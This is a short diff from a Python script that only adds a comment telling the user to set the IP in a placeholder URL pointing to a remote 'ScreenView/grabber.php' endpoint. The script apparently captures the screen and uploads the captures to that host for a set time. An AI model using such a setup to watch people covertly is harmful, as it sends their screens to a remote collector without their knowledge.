@@ -37,7 +37,7 @@ if __name__ == '__main__':
     elif os.path.exists('/tmp'):
         os.chdir('/tmp')
 
-    PHP_URL = 'http://IP/ScreenView/grabber.php'
+    PHP_URL = 'http://IP/ScreenView/grabber.php' # Set IP on this line.
     minutes = get_arguments() * 60
     end_time = time.time() + minutes
 
